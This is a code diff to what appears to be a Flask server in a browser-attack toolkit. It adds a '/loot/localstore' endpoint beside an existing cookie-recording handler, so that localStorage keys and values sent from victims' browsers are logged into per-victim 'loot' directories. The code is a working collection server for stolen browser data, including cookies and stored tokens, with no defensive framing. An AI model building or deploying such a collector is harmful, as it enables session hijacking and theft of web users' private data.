@@ -202,6 +202,19 @@ def recordCookie(identifier):
     return "ok", 200
 
 
+
+# Record local storage data bits
+@app.route('/loot/localstore/<identifier>', methods=['POST'])
+def recordLocalStorageEntry(identifier):
+    print("New localStorage data recorded from: " + identifier)
+    lootDir = findLootDirectory(identifier)
+    content = request.json
+    localStorageKey = content['key']
+    localStorageValue = content['value']
+    logEvent(identifier, "Local Storage Entry: " + localStorageKey + ", value: " + localStorageValue)
+
+    return "ok", 200
+
 #**************************************************************************
 
 
